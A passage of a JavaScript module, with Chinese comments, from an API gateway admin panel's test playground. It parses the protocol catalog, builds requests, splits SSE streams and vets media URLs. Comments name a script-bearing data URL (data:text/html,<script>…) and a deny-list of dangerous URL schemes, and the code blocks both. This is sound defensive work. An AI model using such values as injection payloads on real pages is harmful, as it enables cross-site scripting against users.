**后半句是可以被改掉的，Task 11 就把它改掉了**：真源的 `catalogPayload()` 多了一格\n *    `samplePrompt`，占位文本因此**跟着响应一起来**，本模块不再自己知道它是哪句话。\n *    ⇒ **登记项从四件减到三件。** 别再往回加：真源里那句话改一个字符，\n *    这边跟着变，没有任何东西需要同步。\n * ④ **请求体里那格模型名叫 `model`**。四条协议里三条把模型放请求体、一条放路径，\n *    而「放哪一格」这件事目录没有直接给。判据因此建在**响应自己的形状**上\n *    （`sampleBody` 有没有一格叫 `model` 的字符串），不是 `switch (proto.id)`。\n *    由 `tests/ui/playground.test.ts` 的\n *    「每条协议要么把模型放路径里、要么把模型放请求体里 —— 两头都没有就会静默发默认模型」钉着。\n *\n * ⚠️ **`origin` 是参数不是全局**：这个目录下禁止出现浏览器的那两个顶层全局\n * （`scripts/build-ui.mjs` 里 `js/pure/` 的三条静态校验，违反即 exit 1，含注释里的字样）。\n * 调用方 `admin-ui/js/sec-playground.js` 读一次再传进来。\n *\n * ⚠️⚠️ **本模块一个字节的网关口令都不碰，这不是巧合而是刻意的结构**（全局约束 11(b)）：\n * `buildRequest()` 只交出**鉴权头的名字**，值由 `admin-ui/js/gw-api.js` 在发请求那一刻\n * 现拼。口令因此进不了任何一个被渲染出来的对象——它没有机会漏进 `title`、\n * `data-*`、错误文案或者任何一次调试输出。\n * ⚠️ **唯一的例外是 `authHeaderValue()`**：它按定义要收口令。它**只**被 `gw-api.js`\n * 在拼请求头时调用，返回值一路走到 `fetch` 的 `headers` 里，**不许交给任何渲染代码**。\n * 这条由 `tests/ui/dom/playground-section.test.ts` 的\n * 「面板上任何一处都不出现网关口令 —— 输入框的值不许漏进标题、属性或任何一句错误文案」钉着。\n *\n * ⚠️ **注释里提到对外端点一律写成散文，别加引号或反引号**：\n * `tests/ui/no-hardcoded-endpoints.test.ts` 的\n * 「前端没有任何文件硬编码网关端点路径 —— 端点只许来自 /admin/api/models」\n * 扫的正是「引号紧挨着路径」这个形态，\n * **且不区分代码与注释**（`js/pure/models.mjs` 的文件头记着它当场被咬过一次）。\n *\n * ── **⑤ 视频任务标识的合法形状（P3d Task 12 新增的登记项）** ────────────────────\n * `VIDEO_TASK_ID` 那条正则是 `src/core/admin/protocol-catalog.ts` 里 `VIDEO_TASK_ID_RE`\n * 的**第二份**。**它是一份刻意留下的副本，不是漏搬**：另一条路是让真源把那条正则\n * 随响应送过来、浏览器 `new RegExp()` 出来，而那等于让一份运行期数据决定客户端的\n * 一段控制流（回溯代价由发送方决定）。\n * **两份不许漂**，由 `tests/ui/playground-media.test.ts` 的\n * 「面板那条任务标识判据与网关那条逐个探针同判」\n * 逐个探针对着两条正则跑同一张表钉着。\n */\n\n/** 普通对象，否则 `null`。数组不算。 */\nfunction obj(v) {\n  return typeof v === \"object\" && v !== null && !Array.isArray(v) ? v : null;\n}\n\n/**\n * 响应里那份协议清单，窄化成 Playground 用得上的那几格。\n * **读不出来时是 `null`，不是空数组**——「这个网关一条协议都没有」与「这份响应读不出来」\n * 是两句话，而一个空的协议选择器在屏幕上跟后者长得一模一样（全局约束 9 的同型）。\n *\n * ⚠️ **任何一条格式不对就整份判成读不出来**，不是把坏的那条跳过：跳过之后左栏会少一个\n * 协议档位而**看起来完全正常**，后果是把一条真的能用的协议入口从工具里抹掉。\n *\n * ⚠️ **它与 `js/pure/models.mjs` 的 `catalogProtocols()`、`js/pure/examples.mjs` 的\n * `exampleProtocols()` 是同一份响应的三个视图，不是三份知识**：模型板块只要 id 与\n * 展示名（画徽章用），示例卡还要方法、路径模板、鉴权头与请求体（拼代码用），\n * 这边在示例卡那份之上再要 `streamMode` / `streamKey`（真发请求要决定流式怎么开）。\n * 并成一个函数的代价是模型板块从此要求响应里有 `sampleBody` ——一份它根本不看的字段\n * 缺了就整张表读不出来。\n *\n * ⚠️ **`streamMode` 这里不做白名单**：限定成两个已知值等于「真源多一个形态 ⇒ 整个\n * Playground 读不出来」。表外的形态由 `buildRequest()` 在**真的要开流式那一刻**才拒绝\n * （见那里的说明）——非流式这条路今天不受任何影响。\n *\n * ⚠️ **`samplePrompt` 是整份响应级别的一格，却挂在每一条协议上**（Task 11）。\n * 挂上去的理由是**下游只拿得到 `proto`**：`buildRequest(proto, opts)` 与 `withPrompt()`\n * 的入参里没有那份响应，而把它们的签名全改一遍去多传一个参数，只会让每一个调用点\n * 都有机会传错。**它对四条协议是同一个值**，由本函数一次窄化、一次分发。\n * ⚠️ **缺了它就整份读不出来**，与其余每一格同档：没有它 `withPrompt()` 一处都换不掉，\n * 而那正是「静默丢弃用户输入」那条失效路径的入口。\n */\nexport function playgroundProtocols(payload) {\n  const p = obj(payload);\n  if (p === null || !Array.isArray(p.protocols)) return null;\n  if (typeof p.samplePrompt !== \"string\" || p.samplePrompt === \"\") return null;\n  const out = [];\n  for (const item of p.protocols) {\n    const e = obj(item);\n    if (e === null) return null;\n    if (typeof e.id !== \"string\" || e.id === \"\") return null;\n    if (typeof e.label !== \"string\" || e.label === \"\") return null;\n    if (typeof e.method !== \"string\" || e.method === \"\") return null;\n    if (typeof e.pathTemplate !== \"string\" || e.pathTemplate === \"\") return null;\n    if (typeof e.authHeader !== \"string\" || e.authHeader === \"\") return null;\n    if (typeof e.streamMode !== \"string\" || e.streamMode === \"\") return null;\n    if (typeof e.streamKey !== \"string\" || e.streamKey === \"\") return null;\n    // 每一段都得是非空字符串：一段空串会让 `deltaText()` 去读一格名字为空的属性，\n    // 那一定取不到东西，而**取不到与「这一行不带正文」在下游长得一模一样** ⇒\n    // 整条协议的正文会静默地永远为空。所以判在这里，不留到那时候。\n    if (!Array.isArray(e.streamTextPath) || e.streamTextPath.length === 0) return null;\n    if (!e.streamTextPath.every((s) => typeof s === \"string\" && s !== \"\")) return null;\n    if (obj(e.sampleBody) === null) return null;\n    out.push({\n      id: e.id,\n      label: e.label,\n      method: e.method,\n      pathTemplate: e.pathTemplate,\n      authHeader: e.authHeader,\n      streamMode: e.streamMode,\n      streamKey: e.streamKey,\n      streamTextPath: e.streamTextPath,\n      sampleBody: e.sampleBody,\n      samplePrompt: p.samplePrompt,\n    });\n  }\n  return out;\n}\n\n/**\n * 这条协议上可用的模型 id，**按清单里的顺序**。一个都没有时是空数组。\n *\n * ⚠️ **不是「清单里的全部模型」**：媒体模型的 `protocols` 是空数组，把它填进一条对话\n * 协议的模型下拉里，运维选中之后拿到的是一次注定 4xx 的请求，而面板事先什么都没说。\n */\nexport function modelIdsForProtocol(protocol, models) {\n  if (!Array.isArray(models)) return [];\n  const id = protocol && typeof protocol.id === \"string\" ? protocol.id : null;\n  if (id === null) return [];\n  const out = [];\n  for (const m of models) {\n    const e = obj(m);\n    if (e === null || typeof e.id !== \"string\") continue;\n    if (Array.isArray(e.protocols) && e.protocols.includes(id)) out.push(e.id);\n  }\n  return out;\n}\n\n/** 深拷贝，顺路把每一个字符串叶子交给 `fn` 决定换不换。 */\nfunction mapStrings(value, fn) {\n  if (typeof value === \"string\") return fn(value);\n  if (Array.isArray(value)) return value.map((x) => mapStrings(x, fn));\n  const o = obj(value);\n  if (o === null) return value;\n  const out = {};\n  for (const k of Object.keys(o)) out[k] = mapStrings(o[k], fn);\n  return out;\n}\n\n/**\n * 把用户输入塞进这条协议的请求体。**换不掉就返回 `null`，绝不退回样例。**\n *\n * ⚠️⚠️ **判据是 `sampleBody` 的形状，不是 `switch (proto.id)`。**\n * 后者是把协议 id 又当成一次知识用——四条协议「用户那句话放哪」各不相同\n * （两条在 messages、一条在 input、一条在 contents 里层层套下去的 text），\n * 把那张对照表抄进前端，就是在这里又维护了一次「四条协议长什么样」。\n * `sampleBody` 已经把形状带过来了：**在里面找到那句占位文本、把它换掉**，\n * 形状变了这里自动跟着变。\n *\n * ⚠️ **恰好一处，多一处少一处都判失败。** 真源那边由\n * `tests/unit/admin/protocol-catalog.test.ts` 的\n * 「每条 sample() 的 JSON 里 SAMPLE_PROMPT 恰好出现一次」钉着「恰好一次」这条性质，\n * 这里是它在消费侧的对应判据：找不到（占位文本被改了）与找到多处（样例里别的字段\n * 恰好也等于那句话）**都是「我不知道该往哪儿放」**，而在这两种情况下发出去的请求\n * 一定不是运维以为的那一条。\n *\n * ⚠️ **模型名走请求体那一格（登记项 ④）**：`sampleBody` 里有一格叫 `model` 的字符串时\n * 就把它换成选中的模型，没有那一格说明这条协议把模型放在路径里（`pathTemplate` 带\n * `{model}`）。**两头都没有的协议直接判失败**——那种协议下发出去的请求会用样例里那个\n * 模型，而面板上明明摆着一个模型下拉框，运维会以为自己选的那个生效了。\n */\nexport function withPrompt(proto, model, prompt) {\n  const sample = obj(proto && proto.sampleBody);\n  if (sample === null) return null;\n  // 占位文本**跟着响应来**（`playgroundProtocols()` 分发的那一格），本模块不知道它是哪句话。\n  const slot = proto && typeof proto.samplePrompt === \"string\" ? proto.samplePrompt : \"\";\n  if (slot === \"\") return null;\n  const text = typeof prompt === \"string\" ? prompt : \"\";\n  let hits = 0;\n  const body = mapStrings(sample, (s) => {\n    if (s !== slot) return s;\n    hits++;\n    return text;\n  });\n  if (hits !== 1) return null;\n  const wantsModel = typeof sample.model === \"string\";\n  const hasModel = typeof model === \"string\" && model !== \"\";\n  if (wantsModel) {\n    if (!hasModel) return null;\n    body.model = model;\n  } else if (!String(proto.pathTemplate).includes(\"{model}\")) {\n    // 请求体里没有模型那一格、路径模板里也没有占位符 ⇒ 选中的模型无处可去。\n    return null;\n  }\n  return body;\n}\n\n/**\n * 一次请求需要的四样东西。**构造不出来时返回 `null`。**\n *\n * `opts`: `{ model, prompt, stream, origin }`。\n *\n * ⚠️ **`headerName` 只是头的名字，不含值**（见文件头那段 ⚠️⚠️）：网关口令由\n * `admin-ui/js/gw-api.js` 在发请求那一刻现拼，不进这个返回值、也就进不了任何渲染路径。\n *\n * ⚠️ **网关口令为空时照常构造，由调用方拦。** 把「没填口令」这一判塞进本函数的话，\n * 它会和「口令填错了」一起变成同一个 `null` ——而这两件事在 UI 上必须分得开：\n * 前者要提示「先粘贴口令」，后者是上游回的 401。\n * 由 `tests/ui/playground.test.ts` 的\n * 「网关口令为空时 buildRequest 照常构造 —— 把拦截放进纯函数会让『没填口令』与『口令错』在 UI 上分不开」钉着。\n *\n * ⚠️ **流式怎么开是两条完全不同的路**：Gemini 换的是**路径**，其余三条换的是**请求体\n * 字段**。换错了的后果是**静默降级成非流式**——请求照样 200、内容照样对，只是一次性\n * 全回来了，而面板上没有任何东西会提到这件事。\n * ⚠️ 表外的 `streamMode` 在**要开流式时**判失败（返回 `null`），不是「当成 body 那一档」：\n * 猜错的代价正是上面那句静默降级。**非流式不受影响**——它压根不看这个字段。\n */\nexport function buildRequest(proto, opts) {\n  const o = obj(opts);\n  if (proto === null || proto === undefined || o === null) return null;\n  const model = typeof o.model === \"string\" ? o.model : \"\";\n  const origin = typeof o.origin === \"string\" ? o.origin : \"\";\n  const stream = o.stream === true;\n  const mode = String(proto.streamMode);\n  if (stream && mode !== \"path\" && mode !== \"body\") return null;\n  const template = stream && mode === \"path\" ? proto.streamKey : proto.pathTemplate;\n  // **`split`/`join` 而不是 `replace`**：后者会把替换串里的 `$&` 之类当成引用展开。\n  // 模型名今天由目录白名单限定，这是一道不要钱的保险。\n  const path = String(template).split(\"{model}\").join(model);\n  const body = withPrompt(proto, model, o.prompt);\n  if (body === null) return null;\n  if (stream && mode === \"body\") body[proto.streamKey] = true;\n  return {\n    url: `${origin}${path}`,\n    method: String(proto.method),\n    headerName: String(proto.authHeader),\n    body,\n  };\n}\n\n/**\n * 这一条协议的鉴权头该带什么值（登记项 ②）。**头的名字来自目录，本函数只决定值要不要\n * 带 `Bearer ` 前缀。**\n *\n * ⚠️ **它是本模块唯一收口令的函数**，返回值只许交给 `fetch` 的请求头，\n * **不许交给任何渲染代码**。\n */\nexport function authHeaderValue(authHeader, token) {\n  const value = typeof token === \"string\" ? token : \"\";\n  return authHeader === \"authorization\" ? `Bearer ${value}` : value;\n}\n\n/**\n * 粘进来的这把口令与设置页那个 `hint` 对不对得上（设计 §10.5 的补偿设计）。\n *\n * 面板拿不到明文网关口令（设计 §8.6「凭据只写不读」），能拿到的只有末几位。\n * 于是这里做的是一次**即时的自查**：粘错口令时不必等一次 401 才发现。\n *\n * ⚠️⚠️ **返回值只有一个档位名，绝不含口令的任何一个字节**（全局约束 11(b)）：\n * 返回值会被渲染到屏幕上，把「你粘的是 …abcd，配置里是 …wxyz」这种话画出去，\n * 等于面板自己给出了一条口令末位的旁路。由 `tests/ui/playground.test.ts` 的\n * 「hint 校验的返回值里不含口令的任何片段 —— 它会被渲染出来」钉着。\n *\n * ⚠️ **末几位取几位由 `hint` 自己的长度决定，不写死 4**：真源那边\n * （`src/core/config-provenance.ts` 的 `hintOf`）今天取末 4 位、且短于 5 位时给 `null`。\n * 写死 4 就是在这里又抄了一次那条规则。\n *\n * 四档：`empty`（还没粘）/ `unknown`（设置页读不到 hint，比不了）/ `match` / `mismatch`。\n * ⚠️ **`unknown` 不许被折叠进 `mismatch`**：「比不了」与「比过了、不一样」是两句话，\n * 后者会让运维去改一把其实没错的口令。\n */\nexport function tokenHintState(token, hint) {\n  const tk = typeof token === \"string\" ? token : \"\";\n  if (tk === \"\") return \"empty\";\n  if (typeof hint !== \"string\" || hint === \"\") return \"unknown\";\n  return tk.slice(-hint.length) === hint ? \"match\" : \"mismatch\";\n}\n\n/**\n * 一条 SSE 帧流的切分。**入参是「到目前为止攒下的字节」，出参带着「还没凑齐的尾巴」。**\n *\n * ⚠️⚠️ **必须自己处理跨块切分，不许拿 chunk 边界当事件边界。**\n * 一条 `data:` 行完全可能被拆在两个 `read()` 之间——**这件事在本机的假上游下几乎\n * 永远不会发生**（一次 `write` 就是一块），而在真实网络上必然发生（MTU、TLS record、\n * 反代的缓冲刷新点都会切）。按 chunk 边界切的话，症状是**偶发地丢字 / 冒出半行 JSON**，\n * 而且只在生产上出现。⇒ 攒到 `\\n\\n` 再切，剩下的原样交回给调用方接着攒。\n * 由 `tests/ui/playground.test.ts` 的\n * 「一条 data 行被拆在两个 chunk 里仍被正确重组 —— 按 chunk 边界切的话生产上会偶发丢字」钉着。\n *\n * ⚠️⚠️ **只认 `\\n\\n`，不认 `\\r\\n\\r\\n`——而失败形态是「完全静默」，不是「降级」**（评审 F7）。\n * 网关自己发的是 `\\n\\n`（同源强制，中间只可能有反代）。**若哪天中间某一层把换行\n * 重写成 CRLF**，本函数会一帧都切不出来 ⇒ `payloads` 恒空 ⇒ **对话框永远空白，\n * 而 `malformed` 恒为 0**——**恰好是 `deltaText()` 那三态刻意要防的那种输出形状**\n *（既不显示内容、也不报告任何异常）。**今天没有已知的反代会重写换行，但这句话是\n * 「没查到反例」而不是「查证过不会」。** 登记 P3e。\n *\n * ⚠️ **这是本仓第二份 SSE 帧解析**（第一份是 `src/core/protocol/sse.ts` 的\n * `extractPayloads`，那是网关读**上游**用的）。**如实登记，但它不归全局约束 15 管**：\n * 那条约束管的是「怎么调**这个网关**」（端点路径、请求体形状、协议名），\n * 而 SSE 的帧格式是 W3C 那份 EventSource 规范，不是本网关的知识。\n * 两份实现共享同一套判据（`data:` 前缀、`\\n\\n` 分帧、`[DONE]` 终止），是刻意对齐的。\n *\n * ⚠️⚠️ **「`[DONE]` 终止」这句话一度是假的，本轮才改真**（P3d 全分支评审 F-1，实测）。\n * 上一版见到 `[DONE]` 只是 `done = true` 然后 **`continue`**，接着把同一个缓冲区里\n * **`[DONE]` 之后**那几帧照收不误；网关那份是 `return`，一帧都不再收。\n * 同一段字节喂两份实现：面板 2 条负载、网关 1 条 ⇒ **两份实现在这一条上分叉**。\n * **只有与「openai 纯透传」相乘才可达**（`src/http/routes/openai.ts` 的\n * `if (stream && res.ok)` 那条不解析、原样搬运上游字节，四条协议里唯一的一条）：\n * 真上游若在 `[DONE]` 之后再发一帧带正文的 data，它会被 `deltaText()` 取出来\n * **接在回答后面**，或者（不是合法 JSON 时）被记进 `malformed`——两种都是在替\n * 上游说一句它没说的话。另三条协议看不见这件事，因为网关那份解析已经先剥掉了。\n *\n * ⇒ **本轮的裁定是「对齐行为」，不是「把注释改成两份可以不同」**：\n * 网关那一份是**协议实现**（`[DONE]` 之后就不再有这条流的内容，这是 SSE 的约定），\n * 面板这一份是**展示**——一个展示端在同一段字节上比协议实现多说几句，\n * 那几句正是运维最没有办法判真伪的。**两份实现给出不同答案时，绿的那一份会赢**\n *（`tests/helpers/strip-comments.ts` 记过同一句），所以这里选了收窄。\n * **代价明写**：`[DONE]` 之后的字节从此在面板上完全不可见，openai 那一档也一样\n * ——它与网关对另外三条协议做的事逐字相同，**面板因此在四条协议上给出同一种视图**。\n * 由 `tests/ui/playground.test.ts` 的\n * 「同一段字节喂进去必须给出同一串负载」\n * 那一组钉着（**它同时 import 两份实现，不是抄一份判据过来对**）。\n *\n * @returns `{ payloads, rest, done }`：`payloads` 是这一批凑齐的 `data:` 负载（原始字符串，\n *   **不解析**），`rest` 是还没凑齐的尾巴，`done` = 见到了 `[DONE]`。\n */\nexport function sseFrames(buffer) {\n  const payloads = [];\n  let rest = typeof buffer === \"string\" ? buffer : \"\";\n  let idx;\n  while ((idx = rest.indexOf(\"\\n\\n\")) !== -1) {\n    const frame = rest.slice(0, idx);\n    rest = rest.slice(idx + 2);\n    for (const line of frame.split(\"\\n\")) {\n      // `event:` / `id:` / `retry:` / 注释行（`:` 开头）一律跳过：本模块只要正文。\n      if (!line.startsWith(\"data:\")) continue;\n      // `.trim()` 顺带吃掉 CRLF 换行下那个尾随的 `\\r`（与网关那份逐字同做法）。\n      const payload = line.slice(5).trim();\n      // **就地收尾，与网关那份逐字同语义**（评审 F-1，理由全文在上方那段 ⚠️⚠️）：\n      // 同一帧里 `[DONE]` 之后的 data 行、以及缓冲区里其后的整帧，一律不再收。\n      // `rest` 一并交空串 ⇒ 调用方那句「把尾巴当最后一帧再切一次」也不会把它们捡回来\n      //（`js/gw-api.js` 的 `streamFromGateway()` 在 `found.done` 之后仍会跑那一句）。\n      if (payload === \"[DONE]\") return { payloads, rest: \"\", done: true };\n      if (payload !== \"\") payloads.push(payload);\n    }\n  }\n  return { payloads, rest, done: false };\n}\n\n/**\n * 一条 SSE 数据行里**这一块新增的回答文本**。\n *\n * ⚠️⚠️ **三态，不是两态**（与全局约束 9 同一条纪律）：\n * · `null` —— **这一行读不出来**（不是合法 JSON）。调用方要把它数进 `malformed` 并显示出来。\n * · `\"\"`   —— 这一行读得出来，但**不带正文**。四条协议的流里都夹着这种行\n *   （`message_start` / `content_block_start` / `response.created` / `message_delta` …），\n *   它们是完全正常的。\n * · 非空串 —— 正文。\n * **把这两档折叠成同一个空串就是撒谎**：那样要么每条正常的事件行都被数成畸形\n * （malformed 恒等于事件数，那个计数就没有信息了），要么一条真的坏掉的数据被静默丢弃。\n *\n * ⚠️ **绝不抛。** 一块畸形增量不该让整个对话中断——运维正盯着的那半句话会当场消失，\n * 而面板上只剩一个 transport 错误，看不出是「上游断了」还是「有一块读不动」。\n *\n * ⚠️⚠️ **「正文在哪一格」不在本模块里，它来自协议目录**（`proto.streamTextPath`，\n * 真源 `src/core/admin/protocol-catalog.ts`）。**这是本任务的核心设计决定**：\n * 四条协议的增量各不相同（openai 在 `choices[0].delta.content`、anthropic 在\n * `delta.text`、responses 的 `delta` 就是字符串本身、gemini 在\n * `candidates[0].content.parts[0].text`），把这张四行的对照表写进浏览器，\n * 就是全局约束 15 明令禁止的第四份「四条协议长什么样」。\n *\n * **入参一律当 `unknown` 逐层窄化**：这些字节来自上游，运行期什么形状都可能是。\n * 数字段按数组下标走，其余按属性名走。\n */\nexport function deltaText(proto, dataLine) {\n  const path = proto && Array.isArray(proto.streamTextPath) ? proto.streamTextPath : null;\n  if (path === null || path.length === 0) return null;\n  let node;\n  try {\n    node = JSON.parse(String(dataLine));\n  } catch (e) {\n    return null;\n  }\n  for (const seg of path) {\n    if (Array.isArray(node)) {\n      // 数组只认「非负整数下标」，`Number(\"\")` 会给 0、`Number(\"1x\")` 会给 NaN，\n      // 两者都得挡掉，否则一条写错的路径会静默地取到第 0 项。\n      const i = /^[0-9]+$/.test(String(seg)) ? Number(seg) : -1;\n      if (i < 0 || i >= node.length) return \"\";\n      node = node[i];\n      continue;\n    }\n    const o = obj(node);\n    if (o === null) return \"\";\n    node = o[String(seg)];\n  }\n  // 走到底不是字符串 ⇒ 这一行不带正文（**不是畸形**：它 JSON 解得开）。\n  return typeof node === \"string\" ? node : \"\";\n}\n\n/* ══ 媒体模式（P3d Task 12）══════════════════════════════════════════════════ */\n\n/**\n * 响应里那份**媒体端点**清单，窄化成媒体模式用得上的那几格。\n * 与 `playgroundProtocols()` 同一套纪律：**读不出来时是 `null`，不是空数组**；\n * **任何一条格式不对就整份判成读不出来**，不是把坏的那条跳过（跳过之后视频会少掉\n * 轮询那一条，而屏幕上看起来完全正常——运维建完任务永远等不到成片）。\n *\n * ⚠️ **`sampleBody` 这里允许 `null`，与协议那份不同**：轮询那条是 GET，按定义没有\n * 请求体。判据因此是「`op` 是 poll 就必须没有请求体、否则必须有」——**双向都判**，\n * 单向的话「生成端点漏了请求体」会退化成一次发空 body 的请求。\n *\n * ⚠️ **`op` / `modality` 这里不做白名单**（与 `streamMode` 同一条理由）：限定成今天这两个值\n * 等于「真源多一个形态 ⇒ 整个媒体模式读不出来」。表外的形态在**真的要用它那一刻**\n * 才不匹配任何一档，自然落到「这个形态没有可用端点」那一句上。\n */\nexport function mediaEndpoints(payload) {\n  const p = obj(payload);\n  if (p === null || !Array.isArray(p.media)) return null;\n  if (typeof p.samplePrompt !== \"string\" || p.samplePrompt === \"\") return null;\n  const out = [];\n  for (const item of p.media) {\n    const e = obj(item);\n    if (e === null) return null;\n    if (typeof e.id !== \"string\" || e.id === \"\") return null;\n    if (typeof e.modality !== \"string\" || e.modality === \"\") return null;\n    if (typeof e.op !== \"string\" || e.op === \"\") return null;\n    if (typeof e.method !== \"string\" || e.method === \"\") return null;\n    if (typeof e.pathTemplate !== \"string\" || e.pathTemplate === \"\") return null;\n    if (typeof e.authHeader !== \"string\" || e.authHeader === \"\") return null;\n    // 占位符：有就得是非空串，没有就得是 `null`。**`undefined` 不算「没有」**——\n    // 一格拼错名字的字段会静默变成 `undefined`，那与「这条不带任务标识」长得一样。\n    if (e.taskSlot !== null && (typeof e.taskSlot !== \"string\" || e.taskSlot === \"\")) return null;\n    const body = obj(e.sampleBody);\n    if (e.op === \"poll\") {\n      if (e.sampleBody !== null) return null;\n      // 轮询那条必须**带**占位符，否则轮询 URL 恒等于建任务那条的路径。\n      if (typeof e.taskSlot !== \"string\") return null;\n      if (!e.pathTemplate.includes(e.taskSlot)) return null;\n    } else if (body === null) {\n      return null;\n    }\n    out.push({\n      id: e.id,\n      modality: e.modality,\n      op: e.op,\n      method: e.method,\n      pathTemplate: e.pathTemplate,\n      authHeader: e.authHeader,\n      taskSlot: e.taskSlot,\n      sampleBody: e.sampleBody,\n      samplePrompt: p.samplePrompt,\n    });\n  }\n  return out;\n}\n\n/**\n * 这个形态（image / video）上可用的模型 id，**按清单里的顺序**。\n *\n * ⚠️ 它与 `modelIdsForProtocol()` 是同一件事的另一根轴，**不是同一个函数**：\n * 对话模型按「这条协议在不在它的 protocols 里」筛，媒体模型的 `protocols` 是**空数组**\n * （真源里刻意留空），只能按形态筛。合成一个函数要么多一个参数、要么多一个分支，\n * 而两条路都会让调用点有机会传错轴。\n */\nexport function modelIdsForModality(modality, models) {\n  if (!Array.isArray(models)) return [];\n  if (typeof modality !== \"string\" || modality === \"\") return [];\n  const out = [];\n  for (const m of models) {\n    const e = obj(m);\n    if (e === null || typeof e.id !== \"string\") continue;\n    if (e.modality === modality) out.push(e.id);\n  }\n  return out;\n}\n\n/**\n * 这个媒体结果能不能**内嵌**进面板。**判据是纯函数，不许目测**（订正 F6）。\n *\n * 面板的 CSP 是 img-src 只放行本源与 data 这两档、**而且完全没有 media-src**\n * （`src/ui/serve.ts` 的 `SECURITY_HEADERS`；没有 media-src 意味着 video 元素落回\n * default-src none）⇒ **只有 data 开头且 MIME 是图片的那一种能内嵌，远端地址一律不行。**\n *\n * ⚠️⚠️ **不许为了内嵌去放宽 CSP**（全局约束 17）：`ADMIN_TOKEN` 就存在这个 origin 的\n * 浏览器本地存储里，而**它的作用域是 origin 不是 path**；`src/core/dispatcher.ts` 的\n * `DOCUMENT_MIME` 那段长注释已经论证过「这个源上可以出现一个攻击者影响得了的同源文档」\n * 这条通路。往 img-src / media-src 里加通配主机是主动把那条通路又开大一格。\n *\n * ⚠️ **判据是 MIME，不是协议前缀。** 只判「data 开头」的话，一份\n * `data:text/html,<script>…` 会被判成可内嵌——那正是上面那条通路的入口。\n * ⚠️ **`data:image/svg+xml` 落在放行侧，这是已核实的选择不是疏漏**：它只会被塞进\n * img 元素的 src，而图片上下文里的 SVG 按规范不执行脚本、也发不出请求。\n * **这条不再是「照规范推的」——P3d Task 12 评审用真 Chrome 量过**：\n * 一份内嵌 script 的 `data:image/svg+xml` 塞进 img，图像正常解出（10×10）而\n * 那段脚本**没有运行**。\n * 反过来把 svg 单独挑出去要在这里写一张 MIME 子表，那是第二份判据。\n * ⚠️⚠️ **但「不执行脚本」不等于「零风险」，代价明写（评审 L1）**：SVG 能画**任意矢量\n * 内容**——上游因此可以在结果栏里画出一块看起来像面板自己的东西（假的按钮、假的提示、\n * 假的输入框），也就是一条**界面仿冒面**。今天它被三件事压着：它只出现在右栏一条结果行里、\n * 限高 320px（`admin-ui/css/sections.css` 的 `.pg-media-img`）、而且旁边就摆着那条\n * 地址原文。**别把这段读成「data 图片是安全的」，它是「风险已知且被限制在一格里」。**\n *\n * 由 `tests/ui/playground-media.test.ts` 的\n * 「远端 http(s) 地址一律不可内嵌 —— 面板 CSP 的 img-src 里没有任何远端主机（订正 F6）」\n * 与「data 里是图片才可内嵌，是 HTML 不行 —— 判据是 MIME 不是协议前缀」两格钉着。\n */\nexport function mediaEmbeddable(url) {\n  return typeof url === \"string\" && /^data:image\\//i.test(url);\n}\n\n/**\n * 这个媒体结果能不能**做成一个可以点开的链接**。**裁定的另一半**（评审 I9）。\n *\n * 上游返回的地址是**外部可影响的内容**，而它要被渲染进**存着 `ADMIN_TOKEN` 的那个\n * origin** 的文档里。第一版只守住了「不内嵌」、**没有任何协议白名单**：\n * `javascript:` 今天靠 CSP 的 script-src self 兜着，但**那是第二道防线在替第一道干活**，\n * 与本仓「判据要写成纯函数」的惯例不符——CSP 一旦有人放宽，这里就直接漏。\n *\n * ⚠️⚠️ **白名单，不是黑名单**：只放行 http/https，其余（javascript: / data: / blob: /\n * file: / vbscript: / 以及明天才被发明出来的那一种）一律不做链接。\n * 黑名单写法（`!/^javascript:/i.test(url)`）挡不住任何一个没被列进去的协议，\n * 而**新协议是会被发明出来的**。\n *\n * ⚠️ **`data:image/` 在这里是 false、在 `mediaEmbeddable()` 里是 true，两者不矛盾**：\n * 内嵌进 img 元素与「点开导航过去」是两件事，后者会得到一个**由上游内容决定的顶层\n * 文档**，哪怕它是一张图。\n *\n * 由 `tests/ui/playground-media.test.ts` 的\n * 「javascript: / blob: / file: 一律不可做链接，只有 http(s) 可以」钉着。\n */\nexport function mediaLinkable(url) {\n  if (typeof url !== \"string\") return false;\n  return /^https?:\\/\\//i.test(url);\n}\n\n/**\n * 一份媒体响应体里那些**看起来是媒体地址**的字符串，去重、保持出现顺序。\n *\n * ⚠️⚠️ **判据建在「这个字符串是不是一条地址」上，不是一张字段对照表。**\n * 上游到底把成片放在哪一格（data[].url / url / output[].uri / …）**本仓从来没有核实过**\n * ——`src/http/routes/media.ts` 的文件头写的是「上游返回什么就原样转发」。\n * 编一张对照表出来的后果是：换一个上游实现，面板会**显示「这次没有结果」而响应里明明\n * 有一条地址**，且屏幕上没有任何东西提到这件事。\n * ⇒ 走整棵 JSON、把每一个**可链接或可内嵌**的字符串叶子收上来。\n *\n * ⚠️ **代价明写：它会顺带收进响应里任何一条 http(s) 地址**（上游给的文档链接、\n * 计费页地址之类）。这是刻意选的方向——**多显示一条与结果无关的地址**是看得见的噪音，\n * **漏掉那条成片**是看不见的失效。右栏因此把它们逐条列出来、不替运维挑哪条是成片。\n *\n * ⚠️ **入参一律当 unknown 逐层窄化**：这些字节来自上游，运行期什么形状都可能是。\n * 环状引用不可能出现（它来自 JSON.parse），但深度可能很大 ⇒ 用显式栈而不是递归，\n * 免得一份深层嵌套的响应把调用栈打爆（那会让整个板块抛一次没人接的异常）。\n */\nexport function mediaResultUrls(body) {\n  const out = [];\n  const seen = new Set();\n  const stack = [body];\n  while (stack.length > 0) {\n    const node = stack.pop();\n    if (typeof node === \"string\") {\n      if ((mediaLinkable(node) || mediaEmbeddable(node)) && !seen.has(node)) {\n        seen.add(node);\n        out.push(node);\n      }\n      continue;\n    }\n    if (Array.isArray(node)) {\n      // **倒着压栈**，弹出来才是原顺序——顺序就是运维在屏幕上看到的顺序。\n      for (let i = node.length - 1; i >= 0; i--) stack.push(node[i]);\n      continue;\n    }\n    const o = obj(node);\n    if (o === null) continue;\n    const keys = Object.keys(o);\n    for (let i = keys.length - 1; i >= 0; i--) stack.push(o[keys[i]]);\n  }\n  return out;\n}\n\n/**\n * 视频任务标识的合法形状（**登记项 ⑤**，真源那份是\n * `src/core/admin/protocol-catalog.ts` 的 `VIDEO_TASK_ID_RE`）。\n *\n * ⚠️ **前端也要判，理由不是重复保险**：路由端不匹配会 400，而**面板不拦就是让运维\n * 看一个 400 而不知道为什么**——那条 400 的文案说的是「格式非法」，可运维压根没输入过\n * 这个标识，它是上游在建任务那一步给的。前端拦下来才说得清「上游给的这个标识本网关\n * 不认，两段式在这里断了」。\n */\nexport function videoTaskIdOk(id) 